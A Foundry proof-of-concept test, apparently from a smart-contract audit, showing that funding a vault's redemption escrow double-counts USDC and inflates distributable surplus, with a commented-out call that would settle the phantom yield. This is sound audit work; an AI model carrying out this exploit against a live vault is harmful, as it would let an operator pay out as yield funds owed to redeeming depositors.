// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ATTACK TIMELINE:
// 1. [Setup] Whale deposits 10,000 USDC into the vault and receives USDM.
// 2. [T=1] Whale requests redemption for their entire USDM balance. The RedeemEscrow records the obligation (totalOwed increases), but holds no USDC yet.
// 3. [T=2] Operator calls fundRedemptions, transferring 10,000 USDC from the vault to the RedeemEscrow.
// 4. [T=3] State changes: RedeemEscrow balance == totalOwed, so shortfall() becomes 0. The 10,000 USDC is now counted in totalBackingSigned() AND no longer subtracted from distributableSurplus().
// 5. [T=4] Attacker/Operator exploits the gap: The 10,000 USDC earmarked for redemption is incorrectly reported as distributable surplus.
// 6. [Assert] Verify distributableSurplus() artificially inflated by the exact amount of the funded escrow, proving the double-counting accounting asymmetry.

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/RedeemEscrow.sol";
import "../src/tokens/USDM.sol";

contract AuditAgentPoC is SimulatorBase {
    address whale = makeAddr("whale");

    function test_exploit() public {
        // 1. Setup: Whale deposits USDC to get USDM
        uint256 depositAmount = 10000e6; // 10,000 USDC (assuming 6 decimals)

        // Ensure whale has USDC and use standard deposit flow to avoid SimulatorBase helper reverts
        deal(address(usdc), whale, depositAmount);
        vm.startPrank(whale);
        usdc.approve(address(vault), depositAmount);
        vault.deposit(depositAmount, whale);
        vm.stopPrank();

        uint256 whaleUsdmBalance = usdm.balanceOf(whale);
        assertGt(whaleUsdmBalance, 0, "Whale should have USDM after deposit");

        // 2. Whale requests redemption
        vm.startPrank(whale);
        usdm.approve(address(vault), whaleUsdmBalance);
        uint256 reqId = vault.requestRedeem(whaleUsdmBalance);
        vm.stopPrank();

        uint256 totalOwedBefore = redeemEscrow.totalOwed();
        assertEq(totalOwedBefore, whaleUsdmBalance, "Redeem escrow should track obligation");

        // Check surplus before funding
        int256 surplusBeforeFunding = accountant.distributableSurplus();

        // 3. Operator funds the redeem escrow
        // Ensure vault has USDC to transfer to escrow
        deal(address(usdc), address(vault), depositAmount);

        vm.prank(operator);
        vault.fundRedemptions(depositAmount);

        // 4. Verify state changes
        uint256 escrowBalance = redeemEscrow.balance();
        uint256 escrowShortfall = redeemEscrow.shortfall();

        assertEq(escrowBalance, depositAmount, "Escrow should be fully funded");
        assertEq(escrowShortfall, 0, "Escrow shortfall should be zero when fully funded");

        // 5. Exploit the gap: Check distributable surplus after funding
        int256 surplusAfterFunding = accountant.distributableSurplus();

        // The surplus should NOT have increased just because we moved USDC from vault to escrow.
        // The USDC is earmarked for redemption and should not be distributable as yield.
        // However, because shortfall() is now 0, the subtractive penalty in distributableSurplus() disappears,
        // AND the USDC balance in the escrow is still counted in totalBackingSigned().
        // This creates an artificial inflation of distributable surplus by the exact amount of the escrow balance.

        int256 surplusIncrease = surplusAfterFunding - surplusBeforeFunding;

        console.log("Surplus Before Funding:", uint256(surplusBeforeFunding));
        console.log("Surplus After Funding:", uint256(surplusAfterFunding));
        console.log("Artificial Surplus Increase:", uint256(surplusIncrease));
        console.log("Escrow Balance:", escrowBalance);

        // 6. Assert the vulnerability: The surplus incorrectly increased by the escrow balance amount
        // This proves the double-counting accounting asymmetry where earmarked redemption funds
        // are suddenly treated as distributable yield.
        assertEq(
            surplusIncrease, 
            int256(escrowBalance), 
            "VULNERABILITY: Earmarked redemption USDC incorrectly inflates distributable surplus"
        );

        // Additional proof: The operator could now settle this phantom yield
        // vm.prank(operator);
        // vault.settle(uint256(surplusIncrease)); // This would succeed but declare yield from funds owed to the whale
    }
}
